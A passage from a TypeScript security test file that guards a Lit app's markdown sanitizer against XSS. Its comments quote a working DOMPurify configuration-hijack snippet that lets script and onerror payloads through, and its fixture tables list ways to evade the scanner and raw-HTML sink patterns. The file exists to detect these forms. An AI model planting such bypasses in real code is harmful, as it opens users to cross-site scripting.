 * It is a module-level side effect in a component the app imports, so it runs on
 * load. The behavioural checks in this file never see it: they import
 * util/markdown.js directly and never load the component.
 *
 * The defect class is the one this whole issue keeps rediscovering — a check
 * derived from the thing it is checking cannot falsify it. R1–R7 read the call
 * graph, and the call graph is exactly what this attack leaves intact.
 *
 * R8  Across the scanned set, the sanitizer's own dependencies may be imported
 *     by exactly one file: the sanitizer. Any other scanned file naming either
 *     specifier is a violation.
 *
 * Stated as ownership of the IMPORT, deliberately not as a ban on `addHook`.
 * `setConfig`, `removeHook`, `removeAllHooks`, `clearConfig` and direct property
 * assignment are all equivalent, and enumerating them is the treadmill this
 * round exists to get off. A file that cannot name the module cannot reach its
 * configuration by any method name, present or future.
 *
 * The codebase already understood the sibling hazard and said so at
 * util/markdown.ts — "A private Marked instance keeps this off the shared
 * `marked` singleton" — but DOMPurify's default export IS the shared singleton
 * and had no equivalent protection. `marked` is listed here anyway: the private
 * instance is a property of how markdown.ts is written today, and R8 is what
 * keeps it from being quietly undone from another file.
 *
 * Matching is on the SPECIFIER, not on import syntax, so static, side-effect,
 * namespace, re-export, `require` and dynamic forms — including the
 * template-literal specifier that defeated R6's first draft — are one rule
 * rather than six. Subpaths count: `dompurify/dist/purify.es.mjs` is the same
 * singleton.
 *
 * Read from a view with no per-line opt-out — which, since the marker was
 * removed, is now true of every scan in this file rather than only of the
 * closed-world ones. Disarming a rule that pins the security boundary must
 * require editing THIS file, where a reviewer sees it, not adding a comment to a
 * component.
 *
 * KNOWN SURVIVOR — READ BEFORE EXTENDING THIS RULE. R8 works because the
 * `addHook` attack had to NAME 'dompurify', and a rule can take a name away.
 * Patching `Element.prototype.removeAttribute` and `Node.prototype.removeChild`
 * defeats the sanitizer just as completely and names nothing: R8 has no
 * specifier to match, and the suite stays green. (No count here on purpose —
 * the check total moves every round and a load-bearing literal in prose goes
 * stale silently. It lives next to EXPECTED_CHECKS, once.) That is recorded as
 * V25 in reports/dev-195-vectors.json with its runtime-verified before/after,
 * and it is ACCEPTED, not missed. Rules of this kind can own a name; they
 * cannot own an effect. Do NOT respond by banning `.prototype` assignment — the
 * equivalents are unbounded and the ban would fake coverage. The closure is to
 * observe the effect by loading the sink modules and re-asserting the
 * sanitizer, which needs the component graph compiled and is routed to the
 * Phase 2 harness with V23 and V25 as its acceptance vectors.
 */
const SANITIZER_OWNER = 'src/util/markdown.ts';
const SANITIZER_DEPENDENCIES = ['dompurify', 'marked'];

function sanitizerOwnershipViolations(
  rel: string,
  code: string,
  scanned: ReadonlySet<string>,
): string[] {
  const out: string[] = [];

  // R9. R8 matches on the specifier, so an unscanned file is a laundering point
  // for it: `export { default as P } from 'dompurify'` in a `*.test.ts` file,
  // imported by any scanned component, reaches the singleton without any
  // scanned file naming either dependency. My own hunt, V24b. R6 already said
  // "an unscanned file is only safe while nothing scanned imports it" — it was
  // simply scoped to the two REQUIRED_SINKS files, which is why V24b routed
  // around it through a non-sink component. The statement was right and the
  // scope was wrong, so the same rule now covers the whole scanned set. R8 is
  // not sound without it.
  for (const [, spec] of code.matchAll(new RegExp(RELATIVE_SPECIFIER))) {
    if (!importResolvesIntoScannedSet(rel, spec, scanned)) {
      out.push(
        `${rel}: imports '${spec}', which is outside the scanned set — an unscanned file can ` +
          're-export anything, including the sanitizer dependencies R8 forbids naming here',
      );
    }
  }

  if (rel === SANITIZER_OWNER) return out;
  for (const dep of SANITIZER_DEPENDENCIES) {
    const spec = new RegExp(`['"\`]${dep}(?:/[^'"\`]*)?['"\`]`);
    for (const line of matchLines(code, spec)) {
      out.push(
        `${rel}:${line}: names the module specifier '${dep}'. Only ${SANITIZER_OWNER} may ` +
          "import the sanitizer's dependencies. Any other file holding a reference to them " +
          'can rewrite the shared configuration they are used through — DOMPurify\'s default ' +
          'export is a singleton, and two addHook calls at module scope turn renderMarkdown ' +
          'into a pass-through while every rule about the sink binding still holds.',
      );
    }
  }
  return out;
}

/**
 * The two tree-wide COUNT PINS, written as predicates rather than as inline
 * `if`s inside their checks, so that the fixture table can exercise them
 * directly.
 *
 * Both were live but unfixtured: neutering either left the suite green, because
 * their only input was the real tree, which by construction always has the
 * pinned value. Nothing in the suite could express a wrong count. That is the
 * same "a harness that cannot express an input cannot test it" failure as the
 * arity blind spot, one level down.
 */
function sourceFileCountViolation(found: number): string | null {
  if (found === EXPECTED_SOURCE_FILES) return null;
  return (
    `expected to scan exactly ${EXPECTED_SOURCE_FILES} source files, found ${found} — ` +
    'before changing this number, open the added or removed file(s) and confirm none of ' +
    'them introduces a raw-HTML sink or a raw Lit directive under another name. ' +
    'Adding a file is normally fine and updating the count is normally the right ' +
    'action — but that confirmation is the decision this pin exists to force, and it is ' +
    'the only thing standing between the tree and a raw sink in a brand-new file. ' +
    'Never change it merely to make a red suite go green.'
  );
}

function sinkCountViolation(found: number): string | null {
  if (found === REQUIRED_SINKS.length) return null;
  return (
    `expected exactly ${REQUIRED_SINKS.length} unsafeHTML call sites, found ${found} — ` +
    'update REQUIRED_SINKS deliberately if a sink was added or removed'
  );
}

/**
 * EVERY FIXTURE TABLE IN THIS FILE IS EMPTYABLE, AND THAT IS THE SAME DEFECT
 * THE TABLES WERE ADDED TO FIX.
 *
 * The tables all read `for (const fixture of TABLE) { if (!rule(fixture)) fail }`.
 * With TABLE empty the loop body never runs, the check passes, and the check
 * total is unchanged because the `check()` call site is still there. Measured:
 * emptying any one table leaves the suite green. So the fixtures prove a rule is
 * live only while somebody keeps writing entries into them — which is exactly
 * the "the check derives from the thing it is checking" shape this file has now
 * recorded seven times, one level further out.
 *
 * The pin is an exact count, not `> 0`. A floor of one is satisfied by a table
 * that lost fourteen of its fifteen entries in a bad merge, and the reason to
 * prefer exactness here is the same reason EXPECTED_SOURCE_FILES is exact rather
 * than a floor: the interesting failure is silent SHRINKAGE, and only an exact
 * count sees it.
 *
 * Adding a fixture therefore costs one extra edit. That is deliberate. It is the
 * same bargain as EXPECTED_CHECK_CALL_SITES, and the message says what to do.
 *
 * AND THIS FUNCTION IS ITSELF NOW CONTROLLED, which it was not when the docblock
 * above was written. It was the only rule in this file with no positive control:
 * neutering it to always return null was GREEN 77/122, and stayed green with a
 * fixture table emptied on top of that. The fix it introduced had acquired the
 * exact shape it was written to diagnose, one level further out. See
 * `fixture: the table-size pin fires on a changed table length`.
 */
function fixtureTableViolation(
  name: string,
  table: readonly unknown[],
  expected: number,
): string | null {
  if (table.length === expected) return null;
  return (
    `${name} has ${table.length} entries, expected ${expected}. If you ADDED a fixture, ` +
    'update the number here in the same commit. If you did not, entries have been lost — ' +
    'an emptied or shortened table makes its check pass vacuously, with the check total ' +
    'unchanged, because the loop body simply stops running. Never change this number ' +
    'merely to make a red suite go green.'
  );
}

/**
 * R7, PROMOTED FROM THE TWO SINK FILES TO THE WHOLE SCANNED TREE.
 *
 * R7 bans a unicode or hex escape in code, because `unsafeHTML` is resolved
 * by TypeScript to the imported binding while `\bunsafeHTML\b` cannot see it.
 * Scoped to REQUIRED_SINKS it was sound for those two files and silent for the
 * other 49, and that gap is measurable rather than theoretical: C2-e — shrink
 * REQUIRED_SINKS by one, alias the directive with the escape, render the field
 * raw — was green at 68 checks, and its counterfactual CF-2 (identical mutation,
 * no escape) was red. R7 was the ONLY per-file rule the shrink removed that the
 * tree-wide half did not also carry, which is exactly the shape of finding this
 * file keeps recording: a property that holds for one consumer, relied on as if
 * it held for all.
 *
 * Promoting it does not make mechanism (b) sound — nothing does, it is a
 * tripwire — but it removes the one rule whose absence a scope shrink could
 * convert directly into a working bypass.
 *
 * VIEW: `strings: true`. The tree-wide `scanned` view keeps string contents,
 * and markdown.ts legitimately contains `'︎'` — written as an escape on
 * purpose, because the literal character is invisible in source. A rule that
 * red-lit that is a rule that gets deleted. Blanking strings is also the
 * strictly correct view here: an escape inside a string literal is data, and an
 * escape anywhere else is an identifier spelled to evade a name scan. The
 * per-file R7 keeps its own narrower view (`code`, strings blanked, imports
 * NOT stripped) for the reason documented at its call site — an escape inside an
 * import statement is the whole attack, and this promoted copy does not replace
 * it.
 */
function escapeInCodeOffenders(rel: string, codeNoStrings: string): string[] {
  const lines = matchLines(codeNoStrings, /\\[uxU]/);
  if (lines.length === 0) return [];
  return [
    `${rel}:${lines.join(',')} — an escape outside a string literal lets an identifier be ` +
      'spelled so that every name-based rule in this file misses it, while TypeScript still ' +
      'resolves it to the real binding. Write the name literally.',
  ];
}

/**
 * R6b, PROMOTED FROM THE TWO SINK FILES TO THE WHOLE SCANNED TREE.
 *
 * A dynamic import whose specifier is not a plain quoted literal defeats R6 by
 * construction: there is nothing to resolve, so the module it loads is outside
 * every rule in this file. A template-literal specifier is enough, because
 * `stripInertText` deliberately preserves templates and `['"]` does not match a
 * backtick.
 *
 * WHY IT IS NO LONGER PER-FILE. Scoped to REQUIRED_SINKS this was the same
 * mis-scoping W3 fixed for R7 and R9 fixed for R6 — "a property that holds for
 * one consumer, relied on as if it held for all" — and here the gap was not
 * theoretical. R8/R9 own the CONTIGUOUS QUOTED LITERAL `'dompurify'`, so these
 * two lines in a scanned NON-SINK component left every gate green:
 *
 *   const __p = import('dompur' + 'ify');
 *   void __p.then((m) => (m.default as { setConfig: (c: unknown) => void })
 *     .setConfig({ ADD_TAGS: ['script'], ADD_ATTR: ['onerror'] }));
 *
 * Measured: same instance as the sanitizer's, capture verbatim in the shipped
 * bundle, and renderMarkdown returning
 * `<p><img src="x" onerror="alert(1)"><script>alert(2)</script></p>` against a
 * baseline of `<p><img src="x"></p>`. The concatenation is a non-literal
 * specifier, which is precisely what this rule rejects.
 *
 * READ THE CLAIM NARROWLY. This rule is NOT what closes that attack — the
 * private `createDOMPurify(window)` instance in markdown.ts is, and it closes it
 * by OWNERSHIP, which is the only thing that can own a global. A rule can own a
 * name. This is the tripwire layer: it denies the scanner-blind SPELLING, so the
 * next capture has to be written in a form a reader can see. Both layers were
 * under-modelling `import(…)` independently, and neither was reassurance for the
 * other.
 *
 * VACUOUS AGAINST THE TREE TODAY — no source file here uses a dynamic import at
 * all — which is exactly the R8 situation, so the rule is pinned against
 * DYNAMIC_IMPORT_EVASIONS and DYNAMIC_IMPORT_LEGITIMATE rather than against the
 * tree, and those tables call this function BY NAME.
 */
function dynamicImportSpecifierOffenders(rel: string, code: string): string[] {
  const out: string[] = [];
  for (const arg of callArguments(code, 'import')) {
    if (!/^\s*['"][^'"]*['"]\s*$/.test(arg)) {
      out.push(
        `${rel}:${lineOf(code, code.indexOf(arg))}: import(${arg.trim().slice(0, 60)}) — a ` +
          'dynamic import specifier must be a plain quoted literal, or R6 has nothing to ' +
          'resolve and the module it loads is outside every rule here. A concatenation, a ' +
          'template literal or a variable also hides the specifier from R8/R9, which own the ' +
          "sanitizer's dependencies by matching a contiguous quoted literal.",
      );
    }
  }
  return out;
}

/**
 * The SCOPE pin for mechanism (a). See EXPECTED_REQUIRED_SINKS for why this is
 * not a restatement of `REQUIRED_SINKS.length`: every other consumer, including
 * the check-total, is derived from that array and therefore moves with it.
 */
function requiredSinkScopeViolation(found: number): string | null {
  if (found === EXPECTED_REQUIRED_SINKS) return null;
  return (
    `mechanism (a) is closed over ${found} file(s), but this suite claims ${EXPECTED_REQUIRED_SINKS} — ` +
    'REQUIRED_SINKS changed length. Shrinking it does not fail any derived check, because the ' +
    'check total is derived from it too; a removed entry silently narrows the sound half of ' +
    'the guard to the files that remain. If a component genuinely stopped rendering markdown, ' +
    'update EXPECTED_REQUIRED_SINKS in the same commit and say so in the message. Never change ' +
    'it merely to make a red suite go green.'
  );
}

function sinkBinding(): void {
  const root = findWebRoot();
  const files: string[] = [];
  collectSourceFiles(join(root, 'src'), files);
  // Read by explicit path, not discovered: a missing entry throws here rather
  // than shortening the list. See EXTRA_SCANNED_FILES.
  for (const rel of EXTRA_SCANNED_FILES) {
    const full = join(root, rel);
    statSync(full);
    files.push(full);
  }

  // Two pins, one call site, deliberately. Both answer "is this guard still
  // looking at what it claims to look at" — one for the open-world scan's input,
  // one for the closed-world half's scope — and folding the second in here keeps
  // it out of the EXPECTED_CHECKS arithmetic that the scope pin exists to
  // backstop. A scope pin whose own presence is counted by a total derived from
  // REQUIRED_SINKS would be one more thing that moves when the array moves.
  check('sink scan actually reads the source tree', () => {
    const violations = [
      sourceFileCountViolation(files.length),
      requiredSinkScopeViolation(REQUIRED_SINKS.length),
    ].filter((v): v is string => v !== null);
    if (violations.length > 0) throw new Error(violations.join('\n      '));
  });

  // Web-root-relative paths of every file this guard reads. R6 requires each
  // relative import in a sink file to land in here.
  const scannedRel = new Set(files.map((file) => relative(root, file)));

  // MECHANISM (a). Each required sink is read by explicit path, so a file that is
  // renamed, deleted, or rewritten into a form the tree-wide regexes no longer
  // match fails here instead of quietly leaving their results. See
  // sinkBindingViolations for the four rules and why they are rules rather than
  // a list of banned spellings.
  for (const rel of REQUIRED_SINKS) {
    check(`${rel} binds its markdown sink to the sanitizer`, () => {
      const src = readFileSync(join(root, rel), 'utf8');
      const violations = sinkBindingViolations(rel, src, scannedRel);
      if (violations.length > 0) {
        throw new Error(`sink binding broken:\n      ${violations.join('\n      ')}`);
      }
    });
  }

  // MECHANISM (c). Deliberately NOT built from the `scanned` view below: that one
  // honours the ignore-line marker, and R8 must not be disarmable from outside
  // this file. See sanitizerOwnershipViolations.
  check('the sanitizer exclusively owns its own dependencies', () => {
    const offenders: string[] = [];
    for (const file of files) {
      const rel = relative(root, file);
      const code = stripInertText(readFileSync(file, 'utf8'), { strings: false });
      offenders.push(...sanitizerOwnershipViolations(rel, code, scannedRel));
    }
    if (offenders.length > 0) {
      throw new Error(`sanitizer configuration is reachable from another file:\n      ${offenders.join('\n      ')}`);
    }
  });

  // Comment-stripped view of every scanned file, computed once. `strings: false`
  // keeps module specifiers and quoted property keys intact for the tree-wide
  // patterns that need them. `codeNoStrings` is the same file with string
  // contents blanked too — only the promoted R7 uses it, and it needs that view
  // rather than this one; see escapeInCodeOffenders.
  const scanned = files.map((file) => {
    const src = readFileSync(file, 'utf8');
    return {
      rel: relative(root, file),
      code: stripInertText(src, { strings: false }),
      codeNoStrings: stripInertText(src, { strings: true }),
    };
  });

  const sinks: { file: string; arg: string }[] = [];
  for (const { rel, code } of scanned) {
    for (const arg of callArguments(code, 'unsafeHTML')) {
      sinks.push({ file: rel, arg });
    }
  }

  // Pinned exactly, not as a floor. The old `>= 2` floor sat exactly on the true
  // count, so it caught a disappearing sink only by coincidence — restore the
  // count with a duplicate elsewhere and the same regression goes green again.
  // Update alongside REQUIRED_SINKS when a legitimate sink is added or removed.
  check('unsafeHTML call sites are still found', () => {
    const violation = sinkCountViolation(sinks.length);
    if (violation !== null) throw new Error(violation);
  });

  // MECHANISM (b), tripwire. Indirection defeats every name-based scan in this
  // function: rename the directive and the sink disappears from the case lists
  // rather than failing either. See directiveIndirectionOffenders.
  check('tripwire: no file reaches a raw-HTML directive under another name', () => {
    const offenders: string[] = [];
    for (const { rel, code } of scanned) {
      offenders.push(...directiveIndirectionOffenders(rel, code));
    }
    if (offenders.length > 0) {
      throw new Error(
        'raw-HTML directive obscured by indirection:\n      ' +
          offenders.join('\n      ') +
          '\n      ---\n      ' +
          // Review O2: the previous message named the defect and stopped, which
          // leaves a reader who believes their code is fine with no move except
          // to weaken the rule. Say what the accepted shapes are.
          'A raw-HTML directive must be imported under its own name and only ever ' +
          'appear immediately called: `unsafeHTML(renderMarkdown(x))`. Renaming it, ' +
          'importing its module as a namespace, re-exporting it, or mentioning it in ' +
          'any non-called position defeats every name-based rule in this file.\n      ' +
          'If the sink is legitimate, add the FILE to REQUIRED_SINKS and the call will ' +
          'be checked properly by mechanism (a) instead of tripped over here.\n      ' +
          'If you are only naming the identifier in prose, put it in a comment or a ' +
          'string — both are blanked before this rule runs.\n      ' +
          'TRIPWIRE, NOT PROOF: this catches the listed indirection forms only. Do not ' +
          'read a pass as "no indirection exists"; see the mechanism (b) note above.',
      );
    }
  });

  // R7, tree-wide. Every name-based rule above — here and in the per-file half —
  // assumes an identifier is spelled with the characters it is spelled with.
  // See escapeInCodeOffenders for why this was worth promoting out of the two
  // sink files, and for the measurement that says so.
  check('tripwire: no file spells an identifier with a unicode or hex escape', () => {
    const offenders: string[] = [];
    for (const { rel, codeNoStrings } of scanned) {
      offenders.push(...escapeInCodeOffenders(rel, codeNoStrings));
    }
    if (offenders.length > 0) {
      throw new Error(`escaped identifier in code:\n      ${offenders.join('\n      ')}`);
    }
  });

  // R6b, tree-wide. Every resolution-based rule in this file — R6, R8 and R9 —
  // assumes a module specifier is a contiguous quoted literal it can read. A
  // dynamic import that builds its specifier defeats all three at once, and that
  // is how the sanitizer's own singleton was reachable from a non-sink component
  // until this round. See dynamicImportSpecifierOffenders.
  check('tripwire: every dynamic import specifier is a plain quoted literal', () => {
    const offenders: string[] = [];
    for (const { rel, code } of scanned) {
      offenders.push(...dynamicImportSpecifierOffenders(rel, code));
    }
    if (offenders.length > 0) {
      throw new Error(`unresolvable dynamic import specifier:\n      ${offenders.join('\n      ')}`);
    }
  });

  // The argument must be a bare renderMarkdown(…) call, not merely start with
  // one. `unsafeHTML(renderMarkdown(c.body) + c.body)` satisfied the old
  // prefix-shaped version of this check while rendering the raw body.
  check('every unsafeHTML call site passes nothing but renderMarkdown output', () => {
    const unbound = sinks.filter((s) => !sinkArgumentIsSanitized(s.arg));
    if (unbound.length > 0) {
      throw new Error(
        'unsanitized unsafeHTML sink(s): ' +
          unbound.map((s) => `${s.file} -> unsafeHTML(${s.arg.trim().slice(0, 60)})`).join(', '),
      );
    }
  });

  // unsafeHTML is not the only way to reach the DOM with a raw string; a new
  // innerHTML sink would bypass renderMarkdown without touching the checks
  // above. See BANNED_SINKS for the scope and — importantly — the limits.
  check('tripwire: no listed raw-HTML sink other than unsafeHTML is present', () => {
    const offenders: string[] = [];
    for (const { rel, code } of scanned) {
      for (const { name, pattern } of BANNED_SINKS) {
        if (pattern.test(code)) {
          offenders.push(`${rel} (${name})`);
        }
      }
    }
    if (offenders.length > 0) {
      throw new Error(
        `raw-HTML sink outside renderMarkdown in: ${offenders.join(', ')} ` +
          '[tripwire: an enumeration of known sinks, not a proof of absence]',
      );
    }
  });

  // ---------------------------------------------------------------------------
  // Fixtures for the rules themselves.
  //
  // Everything above is asserted against the tree, so it only exercises the
  // shapes the tree happens to contain. The `lit/static-html.js` false-positive
  // control that previous rounds cited as deliberate passed VACUOUSLY: no file
  // in the repo imports it, so nothing ran. Adding production code to create a
  // control would be worse. These tables exercise the rules directly, and sit
  // under the same EXPECTED_CHECKS pin as everything else.
  //
  // The positive tables are the regression test for this round specifically:
  // every evasion found by the review rounds is listed.
  //
  // READ THE COVERAGE CLAIM NARROWLY. This used to say "a future simplification
  // of the rules cannot quietly reopen one", full stop. Measured by ablation,
  // that is TRUE FOR THE NINE CLOSED-WORLD RULES and was FALSE for the tree-wide
  // ones: deleting R1, deleting R3, or deleting the tree-wide argument check left
  // the suite green — those three are subsumed by other rules, so the redundancy
  // is real and they are kept as defence in depth rather than deleted — but the
  // file-count pin, the sink-count pin, the BANNED_SINKS tripwire and the
  // `opts.strings` blanking were each LIVE AND UNFIXTURED, protective in
  // principle and deletable in practice. Those four now have positive fixtures
  // of their own below, which is what makes the claim true rather than what
  // makes it comfortable.
  //
  // The residue, stated so nobody has to re-measure it: a fixture asserts a
  // PREDICATE, so it catches a neutered predicate and not a deleted call site.
  // Deleting a whole `check()` is caught by EXPECTED_CHECKS instead. Nothing
  // here catches deleting a rule that is genuinely subsumed by another, and
  // nothing should — that is a refactor, not a regression.
  // ---------------------------------------------------------------------------

  const LEGITIMATE_SOURCE = [
    "import { html } from 'lit/static-html.js';",
    "import { html, literal } from 'lit/static-html.js';",
    "export { html as staticHtml } from 'lit/static-html.js';",
    "import { unsafeHTML } from 'lit/directives/unsafe-html.js';",
    'const t = html`${unsafeHTML(renderMarkdown(this.body))}`;',
    'const parsed = value as unknown as string;',
    'const proto = /^https:\\/\\//.test(url);',
    'const rx = /innerHTML\\s*=/;',
    'const sep = /[//]/.source;',
    'const node = document.createElement("div");',
    'el.textContent = body;',
    'if (el.innerHTML === previous) return;',
    // The mirror of the F1/R2 positive below: `import.meta` is ordinary Vite
    // source and must stay accepted. The negative lookahead added to
    // `stripImportStatements` makes the `import` of `import.meta` stop starting
    // a statement match; this pins that it did not also stop the REAL import on
    // the next line from being blanked, which is what would turn a correct file
    // red by leaving `unsafeHTML` visible outside called position.
    'const dev = import.meta.env.DEV\n' +
      "import { unsafeHTML } from 'lit/directives/unsafe-html.js';\n" +
      'const t = html`${unsafeHTML(renderMarkdown(this.body))}`;',
  ];

  // The promoted R7's false-positive controls. Kept in their own table because
  // that rule reads a DIFFERENT VIEW of the file (`strings: true`) from every
  // other tree-wide rule, and the whole reason it needs that view is the first
  // entry: markdown.ts writes U+FE0E as an escape on purpose, and a rule that
  // red-lights production code as it stands is a rule that gets deleted rather
  // than a rule that protects anything.
  const ESCAPE_LEGITIMATE = [
    "const glyph = '\\u2611\\uFE0E';",
    'const re = /\\u00a0/g;',
    'const path = "c:\\\\users\\\\x";',
    '// \\u0075nsafeHTML in prose is inert',
  ];

  check('fixture: legitimate source does not trip the raw-directive tripwire', () => {
    const offenders: string[] = [
      fixtureTableViolation('LEGITIMATE_SOURCE', LEGITIMATE_SOURCE, 13),
      fixtureTableViolation('ESCAPE_LEGITIMATE', ESCAPE_LEGITIMATE, 4),
    ].filter((v): v is string => v !== null);
    for (const fixture of LEGITIMATE_SOURCE) {
      const code = stripInertText(fixture, { strings: false });
      offenders.push(...directiveIndirectionOffenders('<fixture>', code).map((o) => `${o} :: ${fixture}`));
      for (const { name, pattern } of BANNED_SINKS) {
        if (pattern.test(code)) offenders.push(`${name} :: ${fixture}`);
      }
    }
    for (const fixture of ESCAPE_LEGITIMATE) {
      const codeNoStrings = stripInertText(fixture, { strings: true });
      offenders.push(
        ...escapeInCodeOffenders('<fixture>', codeNoStrings).map((o) => `${o} :: ${fixture}`),
      );
    }
    if (offenders.length > 0) {
      throw new Error(`the guard rejects legitimate source: ${offenders.join(' | ')}`);
    }
  });

  // Prose only. The string-literal entry that used to live here relied on the
  // `raw-sink-scan: ignore-line` opt-out; that opt-out is gone, and the same
  // line is now a POSITIVE in BANNED_SINK_POSITIVES below.
  const INERT_PROSE = [
    '// SECURITY: never import unsafeHTML as something else - it defeats the scan.',
    '// Do not use document.write( here; use lit templating.',
    '/* renderMarkdown must wrap every unsafeHTML call. */',
    'const t = html`<!-- renderMarkdown, not unsafeHTML, is the boundary. -->${x}`;',
  ];

  check('fixture: comments cannot turn the suite red', () => {
    const offenders: string[] = [
      fixtureTableViolation('INERT_PROSE', INERT_PROSE, 4),
    ].filter((v): v is string => v !== null);
    for (const fixture of INERT_PROSE) {
      const code = stripInertText(fixture, { strings: false });
      offenders.push(...directiveIndirectionOffenders('<fixture>', code).map((o) => `${o} :: ${fixture}`));
      for (const { name, pattern } of BANNED_SINKS) {
        if (pattern.test(code)) offenders.push(`${name} :: ${fixture}`);
      }
    }
    if (offenders.length > 0) {
      throw new Error(`the guard rejects prose about itself: ${offenders.join(' | ')}`);
    }
  });

  const INDIRECTION_EVASIONS = [
    "import { unsafeHTML as raw } from 'lit/directives/unsafe-html.js';",
    "import { unsafeHTML as raw } from 'lit-html/development/directives/unsafe-html.js';",
    "import { unsafeSVG as raw } from 'lit/directives/unsafe-svg.js';",
    "import { unsafeStatic as raw } from 'lit/static-html.js';",
    "import * as d from 'lit/directives/unsafe-html.js';",
    "export { unsafeHTML } from 'lit/directives/unsafe-html.js';",
    "export * from 'lit/directives/unsafe-html.js';",
    'const raw = unsafeHTML;',
    'const S = { raw: unsafeHTML };',
    "const { unsafeHTML: raw } = await import('lit/directives/unsafe-html.js');",
    'const d = unsafeHTML as unknown as (s: string) => unknown;',
    'const raw = unsafeHTML\n;',
    'callIt(unsafeHTML);',
    // The V10 shape, tree-wide: one import statement must not be able to swallow
    // the next and take a value alias with it.
    "import { unsafeHTML } from 'lit/directives/unsafe-html.js'\n" +
      'const rawHtml = unsafeHTML\n' +
      "import { renderMarkdown } from '../../util/markdown.js';",
    // T2: an unterminated `<!--` inside a lit template must not blank the rest of
    // the file. This compiles clean, so `tsc` is not a second gate on it.
    'const t = html`<!-- forgot to close this\n${x}`;\nconst raw = unsafeHTML;',
    // F1/R2: the V10 shape again, re-entered through `import.meta`. The alias is
    // BETWEEN an `import.meta` expression and a later `from '…'` clause, so the
    // pre-fix `stripImportStatements` blanked it as if it were part of an import
    // statement. Compiles clean; was green at 69 checks in a non-sink file that
    // then re-exported the directive into a sink. The missing semicolons are
    // load-bearing, not sloppiness: `[^;'"]` stops at a semicolon, so the
    // swallow only reaches the alias while the `import.meta` line and the alias
    // line both end without one.
    'const dev = import.meta.env.DEV\n' +
      'const rawHtml = unsafeHTML\n' +
      "export { css as _css } from 'lit';",
    // B3b: the SAME swallow again, re-entered through the THIRD production of
    // `import` — the call expression. `import(<non-literal>)` has no quoted
    // specifier for `[^;'"]` to stop against, so the match ran forward to the
    // next `from '…'` and blanked the alias between them, exactly as
    // `import.meta` did before the entry above was added. A quoted specifier is
    // NOT enough to reproduce it: `import('lit')` stops the match at its own
    // quote, which is the property `[^;'"]` was chosen for. The specifier has to
    // be an identifier.
    //
    // Measured on this tree with one-token attribution: this block appended to
    // the real non-sink src/util/format.ts was GREEN 75/122 with tsc exit 0, and
    // both controls were RED — the same block with `import.meta.env.DEV`, and
    // the same block with the `import(spec)` line simply deleted.
    'const spec = getSpec()\n' +
      'const dev = import(spec)\n' +
      'const rawHtml = unsafeHTML\n' +
      "export { css as _css } from 'lit';",
  ];

  // The promoted R7's positives. V8 and V8b were pinned as SINK_EVASIONS, which
  // run against the two REQUIRED_SINKS files only; these are the same two forms
  // asserted against the rule that now covers all 51. Attribution is kept
  // explicit — this loop calls `escapeInCodeOffenders` by name rather than
  // asking whether ANY tree-wide rule fired — because C2-e's whole lesson is
  // that "something caught it" and "this rule caught it" are different claims.
  const ESCAPE_EVASIONS = [
    'const rawHtml = \\u0075nsafeHTML;',
    "import { \\u0075nsafeHTML as rawHtml } from 'lit/directives/unsafe-html.js';",
    'const rawHtml = \\u{75}nsafeHTML;',
    'el.inner\\u0048TML = body;',
  ];

  check('fixture: every known indirection form is caught by the tripwire', () => {
    const missed: string[] = [
      fixtureTableViolation('INDIRECTION_EVASIONS', INDIRECTION_EVASIONS, 17),
      fixtureTableViolation('ESCAPE_EVASIONS', ESCAPE_EVASIONS, 4),
    ].filter((v): v is string => v !== null);
    for (const fixture of INDIRECTION_EVASIONS) {
      const code = stripInertText(fixture, { strings: false });
      const found = directiveIndirectionOffenders('<fixture>', code);
      if (found.length === 0) missed.push(fixture);
      // Review O2, pinned rather than merely fixed. Three of the four branches
      // in this rule reported a file and no position. Requiring `rel:line:` of
      // EVERY offender means a branch added later cannot quietly omit it, and a
      // fix that regresses is caught here instead of by the next reader of a
      // 400-line component.
      for (const offender of found) {
        if (!/^<fixture>:\d+: /.test(offender)) {
          missed.push(`offender has no line number: ${offender}`);
        }
      }
    }
    for (const fixture of ESCAPE_EVASIONS) {
      const codeNoStrings = stripInertText(fixture, { strings: true });
      if (escapeInCodeOffenders('<fixture>', codeNoStrings).length === 0) {
        missed.push(`escape not caught: ${fixture}`);
      }
    }
    if (missed.length > 0) {
      throw new Error(`indirection form no longer detected: ${missed.join(' | ')}`);
    }
  });

  // One entry per BANNED_SINKS pattern, plus the operator variants the pattern's
  // own comment claims to cover. Until this table existed the only fixtures
  // touching BANNED_SINKS were the two NEGATIVE controls above, so the entire
  // list was untested detection logic: measured, neutering one pattern, deleting
  // one entry, or emptying the whole array each left the suite green at 61.
  // A negative control cannot fail an over-permissive rule — that is the point
  // of the pairing, and this is the last of the four rule groups in this file to
  // get its positive half.
  const BANNED_SINK_POSITIVES = [
    'el.innerHTML = body;',
    'el.outerHTML = body;',
    'el.innerHTML += body;',
    'el.innerHTML ||= body;',
    'el.innerHTML &&= body;',
    'el.innerHTML ??= body;',
    "el['innerHTML'] = body;",
    'el["outerHTML"] = body;',
    'el.insertAdjacentHTML("beforeend", body);',
    'document.write(body);',
    'el.setHTMLUnsafe(body);',
    'range.createContextualFragment(body);',
    'return unsafeSVG(body);',
    'return unsafeStatic(body);',
    // T3: a line still carrying the removed opt-out marker is ordinary source.
    // If someone re-honours the marker, this entry goes red.
    "const ADVICE = 'never do el.innerHTML = userInput'; // raw-sink-scan: ignore-line",
  ];

  // BOTH QUANTIFIERS, AND THE SECOND IS THE ONE THAT WAS MISSING.
  //
  // "Every positive is matched by some pattern" is the direction this check has
  // always run, and it is the weaker one: it ranges over the FIXTURES, so it
  // says nothing about a pattern that no fixture exercises. Adding a ninth
  // BANNED_SINKS entry with a typo in it, or a pattern that can never match,
  // leaves this green — the table it ranges over does not know the pattern
  // exists.
  //
  // "Every pattern is matched by some positive" ranges over the RULES instead,
  // so a new pattern arrives uncovered and says so. Together they are a
  // bijection-ish coverage claim over an enumerated rule list, which is the only
  // rule group in this file that HAS an enumerated list to range over — the
  // other rules are code paths, and the honest note there is that their fixture
  // tables carry the same weakness with no equivalent fix available. Recorded
  // rather than papered over.
  check('fixture: every banned raw-HTML sink form is actually detected', () => {
    const problems: string[] = [
      fixtureTableViolation('BANNED_SINK_POSITIVES', BANNED_SINK_POSITIVES, 15),
      fixtureTableViolation('BANNED_SINKS', BANNED_SINKS, 8),
    ].filter((v): v is string => v !== null);

    const views = BANNED_SINK_POSITIVES.map((fixture) => ({
      fixture,
      code: stripInertText(fixture, { strings: false }),
    }));

    for (const { fixture, code } of views) {
      if (!BANNED_SINKS.some(({ pattern }) => pattern.test(code))) {
        problems.push(`no pattern detects: ${fixture}`);
      }
    }
